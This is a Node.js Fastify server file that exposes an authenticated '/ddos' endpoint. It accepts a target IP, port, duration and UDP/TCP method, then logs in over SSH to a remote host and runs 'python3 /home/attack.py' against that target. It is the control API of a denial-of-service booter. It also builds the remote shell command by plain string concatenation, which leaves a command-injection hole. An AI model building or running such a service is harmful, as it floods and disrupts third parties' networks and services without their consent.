// Require the framework and instantiate it
const fastify = require('fastify')({ logger: true })
const bearerAuthPlugin = require('@fastify/bearer-auth')
const config = require('./config.json')
const { Client } = require('ssh2');
const keys = new Set([config.key]);

fastify.register(bearerAuthPlugin, {keys})
fastify.post('/ddos', function (req, res) {
    let settings = req.body;

    if (settings.ip == undefined){ // Check if IP is set
        res.send({success:'False', error:'IP not set'})
    };
    if (settings.port == undefined){ // Check if port is set
        res.send({success:'False', error:'Port not set'})
    };
    if (settings.time == undefined){ // Check if time is set
        res.send({success:'False', error:'Time not set'})
    };
    if (settings.method == undefined){ // Check if method is set
        res.send({success:'False', error:'Method not set'})
    };
    if (settings.method != 'udp' && settings.method != 'tcp'){ // Check if method is valid
        res.send({success:'False', error:'Invalid method'})
    };
    if (settings.time < 1 || settings.time > 60){ // Check if time is valid
        res.send({success:'False', error:'Invalid time'})
    };
    if (settings.ip.split('.').length != 4){ // Check if IP is valid
        res.send({success:'False', error:'Invalid IP'})
    };
    if (settings.port < 1 || settings.port > 65535){ // Check if port is valid
        res.send({success:'False', error:'Invalid port'})
    };
    try {
        attack(settings.ip, settings.port, settings.time, settings.method)
    }
    catch (err){
        res.send({success:'False', error:err})
    }
    res.send({success:'True', error:'None'})
})
async function attack(host, port, time, method){
    let conn = new Client();
    conn.on('ready', function() {
        conn.exec('python3 /home/attack.py ' + host + ' ' + port + ' ' + time + ' ' + method, function(err, stream) {
            if (err) throw err;
            stream.on('close', function(code, signal) {
                console.log('Stream :: close :: code: ' + code + ', signal: ' + signal);
                conn.end();
            }).on('data', function(data) {
                console.log('STDOUT: ' + data);
            }).stderr.on('data', function(data) {
                console.log('STDERR: ' + data);
            });
        });
    }).connect({
        host: config.host,
        port: config.port,
        username: config.username,
        password: config.password
    });
}
// Start the server
fastify.listen(3000, function (err, address) {
    if (err) {
        console.error(err)
        process.exit(1)
    }
    console.log(`Server listening on ${address}`)
})
